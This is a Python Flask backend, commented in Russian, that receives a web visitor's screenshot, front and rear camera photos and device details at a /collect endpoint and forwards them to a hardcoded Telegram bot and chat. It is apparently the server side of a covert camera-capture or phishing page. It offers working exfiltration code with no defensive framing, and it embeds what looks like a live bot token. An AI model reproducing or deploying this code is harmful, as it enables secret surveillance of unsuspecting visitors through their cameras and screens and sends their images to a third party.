import os
import base64
import logging
from datetime import datetime

import requests
from flask import Flask, request, jsonify, render_template
from flask_cors import CORS

app = Flask(__name__)
CORS(app)  # Разрешаем запросы с любых доменов
logging.basicConfig(level=logging.INFO)

# ====== НАСТРОЙКИ ======
TELEGRAM_TOKEN = "8757264040:AAEQr6UPKMeaR_9PWv_Np5F-vLcXag2GyXc"   
CHAT_ID = "8382511631"                       
# ========================

TELEGRAM_API = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}"


def send_telegram_photo(base64_data, caption):
    """Отправляет фото в Telegram"""
    try:
        if "," in base64_data:
            base64_data = base64_data.split(",")[1]
        photo_bytes = base64.b64decode(base64_data)

        files = {"photo": ("photo.jpg", photo_bytes, "image/jpeg")}
        data = {
            "chat_id": CHAT_ID,
            "caption": caption[:200],  # Telegram ограничение
            "parse_mode": "HTML"
        }
        resp = requests.post(f"{TELEGRAM_API}/sendPhoto", files=files, data=data, timeout=30)
        logging.info(f"Отправка фото: {resp.status_code}")
        return resp.ok
    except Exception as e:
        logging.error(f"Ошибка отправки фото: {e}")
        return False


def send_telegram_text(text):
    """Отправляет текст в Telegram"""
    try:
        resp = requests.post(f"{TELEGRAM_API}/sendMessage", json={
            "chat_id": CHAT_ID,
            "text": text[:4000],
            "parse_mode": "HTML"
        }, timeout=15)
        return resp.ok
    except Exception as e:
        logging.error(f"Ошибка отправки текста: {e}")
        return False


@app.route("/")
def index():
    return render_template("index.html")


@app.route("/collect", methods=["POST", "OPTIONS"])
def collect():
    """Принимает данные и отправляет в Telegram"""
    if request.method == "OPTIONS":
        return jsonify({"status": "ok"})
    
    try:
        data = request.get_json(force=True)
        device = data.get("device", {})
        
        # Формируем короткую информацию об устройстве
        screen = device.get("screen", {})
        device_text = (
            f"📱 Устройство:\n"
            f"• Платформа: {device.get('platform', 'N/A')}\n"
            f"• Экран: {screen.get('width', '?')}x{screen.get('height', '?')}\n"
            f"• Браузер: {device.get('userAgent', 'N/A')[:40]}"
        )

        photos_sent = 0

        # Скриншот
        if data.get("screenCapture"):
            if send_telegram_photo(data["screenCapture"], f"🖥 Скриншот\n\n{device_text}"):
                photos_sent += 1
                logging.info("Скриншот отправлен")

        # Фронтальная камера
        if data.get("frontCamera"):
            if send_telegram_photo(data["frontCamera"], f"📸 Фронтальная камера\n\n{device_text}"):
                photos_sent += 1
                logging.info("Фронталка отправлена")

        # Тыловая камера
        if data.get("backCamera"):
            if send_telegram_photo(data["backCamera"], f"📸 Тыловая камера\n\n{device_text}"):
                photos_sent += 1
                logging.info("Тыловая отправлена")

        # Если ничего не отправлено — шлём текст
        if photos_sent == 0:
            send_telegram_text(f"⚠️ Данные без фото\n\n{device_text}")
            logging.info("Отправлен текст (без фото)")

        return jsonify({"status": "ok"})

    except Exception as e:
        logging.error(f"Ошибка: {e}")
        return jsonify({"status": "ok"})  # Всё равно возвращаем ok


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
